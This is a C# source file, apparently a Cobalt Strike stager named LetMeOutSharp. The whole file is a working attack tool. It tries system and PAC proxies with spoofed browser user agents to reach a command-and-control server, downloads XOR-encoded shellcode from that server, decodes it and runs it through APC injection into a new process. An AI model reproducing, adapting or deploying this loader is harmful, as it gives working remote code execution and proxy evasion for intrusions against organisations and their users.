using System;
using System.Collections.Generic;

namespace LetMeOutSharp
{
    public class MainClass
    {
        public static void Main(string[] args)
        {
            var canTalk = false;

            Uri C2 = new Uri("%C2URL%");
            const string responseFromCheckurl = "%RESPONSE%"; // check response from our server

            if (!canTalk)
            {
                var proxies = new List<ConfigPair>();
                proxies.AddRange(Enumerator.GetProxiesFromPAC());
                proxies.AddRange(Enumerator.GetProxies());
                proxies.Add(new ConfigPair { URL = null, UserAgent = UserAgents.EDUA });
                proxies.Add(new ConfigPair { URL = null, UserAgent = UserAgents.CHUA });
                proxies.Add(new ConfigPair { URL = null, UserAgent = UserAgents.FFUA });
#if DEBUG
                Console.WriteLine("\nWill try {0} connectivity methods", proxies.Count);
                foreach (var proxy in proxies)
                {
                    Console.WriteLine(proxy);
                }
#endif
                foreach (var proxy in proxies)
                {
                    try
                    {
                        // a = base64 encoded proxy url, b = base64 encoded user agent, c = 1 for 64-bit or 0 for 32-bit
                        var info = string.Format("a={0}&b={1}&c={2}", proxy.URLString.ToBase64(), proxy.UserAgent.ToBase64(), Utilities.Is64BitProcess);
                        if (Enumerator.DoHTTP(C2, responseFromCheckurl, info, proxy))
                        {
                            canTalk = true; 
#if DEBUG
                            Console.WriteLine("Success with: {0}", proxy);
#endif

                            // Adding a small delay waiting for the shellcode to be generated - if you are getting errors in artifact_payload you may need to increase it
                            System.Threading.Thread.Sleep(10000);
                            string variant = "";
                            if (proxy.UserAgent.Equals(UserAgents.EDUA))
                            {
                                variant = "edge"; //This value should match with the value in AggressiveProxy.cna and your Malleable profile variant
                            }
                            else if (proxy.UserAgent.Equals(UserAgents.CHUA))
                            {
                                variant = "chrome"; //This value should match with the value in AggressiveProxy.cna and your Malleable profile variant
                            }
                            else if (proxy.UserAgent.Equals(UserAgents.FFUA))
                            {
                                variant = "firefox"; //This value should match with the value in AggressiveProxy.cna and your Malleable profile variant
                            }
                            string arch = "x64";
                            if (Utilities.Is64BitProcess.Equals("0"))
                            {
                                arch = "x86";
                            }
                            Uri shellcodeUrl = new Uri(string.Format("{0}/{1}{2}{3}", C2.GetLeftPart(UriPartial.Authority), proxy.URLString.ToBase64(), variant.ToBase64(), arch.ToBase64()));
#if DEBUG
                            Console.WriteLine("Will request: {0}", shellcodeUrl);
#endif
                            string shresponse = Enumerator.GetHTTP(shellcodeUrl, proxy);
#if DEBUG
                            Console.WriteLine("Shellcode length: {0}", shresponse.Length);
#endif
                            byte[] values = shresponse.ConvertHexStringToByteArray();
                            
                            for (int i = 0; i < values.Length; i++)
                            {
                                values[i] = (byte)(values[i] ^ 0x2a); // If XOR keys gets changed in the AggressorScript, make sure to change it here as well
                            }
                            new ApcInjectionNewProcess(values);
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
#if DEBUG
                        Console.WriteLine("[*] An exception occured: {0}", ex.Message);
#endif
                    }
                }
#if DEBUG                
                Console.WriteLine("Finish...");
#endif
            }
        }
    }
}